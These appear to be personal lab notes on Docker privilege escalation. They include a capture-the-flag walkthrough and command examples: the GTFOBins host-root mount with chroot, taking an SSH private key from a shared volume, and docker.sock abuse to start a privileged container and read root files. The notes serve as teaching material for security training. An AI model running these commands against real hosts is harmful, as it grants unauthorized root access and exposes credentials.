
## 🐳 What is Docker?

- **Docker** is like a lightweight virtual machine system.
- It uses **containers** to run applications in **isolated environments**.
- Each container is created from a **Docker image** — a ready-to-run mini OS with the app inside.
- The containers run on top of the real system, but they are **separate** — kind of like apps running in their own box.

---

## 🔓 Why Docker Can Be Dangerous

If a user is allowed to **run Docker commands** (is in the `docker` group), **they can break out of the container** and get **root access on the host system**.

---
## 🧠 Who Can Do This?

You can try Docker privilege escalation if:
```bash
id
```
Shows something like:
```bash
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```
👉 You are in the `docker` group. That means you can fully control Docker — and **that's root-level power**.

___

![[Pasted image 20250712163946.png]]
### Privilege Escalation

We will use the **[GTFOBIN](https://gtfobins.github.io/gtfobins/docker/)** to elevate privileges on the target machine. It tells us that in order to get out of the restricted environment of docker, we need to spawn an interactive shell inside the docker.

![[Pasted image 20250712164006.png]]

We run the script directly from the GTFOBIN. However, it gave us an error stating that it was unable to find the alpine image. Therefore, we use the docker ps -a command to list the images available on this Docker instance. We observe that there is an image named bash. As a result, we replace the image name from alpine to bash in the command. After running the modified command again, we find that we are able to gain root access. Finally, we use the cat command to read the private key for the root user, as required to conclude this machine.

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

docker ps -a

docker run -v /:/mnt --rm -it bash chroot /mnt sh
```


---
## 💣 Privilege Escalation Techniques with Docker
### 🛠 1. Run a container with access to the host system

Use this command:
```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

What this does:
    Runs an Ubuntu container
    Mounts the host system’s root / into the container at /mnt
    Enters the host system as root from inside the container

Now you’re root on the host!

📁 2. Look for shared folders (volume mounts)

Sometimes Docker is set up to share folders from the host system into the container.

Inside the container, you might see:
```bash
cd /hostsystem/home/cry0l1t3
ls -la
```

And find files like `.ssh/id_rsa` (private SSH key).  
Copy it, and then from your local machine:

```bash
ssh cry0l1t3@<host-ip> -i cry0l1t3.priv
```
✅ You’re now logged in as that user.

___
### 🧷 3. Docker socket abuse (`docker.sock`)

You might find a file like:
```bash
srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
```

This is the **Docker socket**, used to talk to the Docker daemon (the real brain behind containers).

If it's accessible:
- You can upload a Docker binary
- Then run Docker commands **inside the container** to start a new **privileged container** and escape

Example:
```bash
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

Then : 

```bash
/tmp/docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
cd /hostsystem
cat /hostsystem/root/flag.txt

```

💥 You now have root access to the host system via a Docker container!

# 🧪 Bonus: Docker Compose or SUID Docker

If docker is run with SUID (setuid permission), or you're in the sudoers file and allowed to run Docker, same idea applies. You can start privileged containers, mount the host, and escape.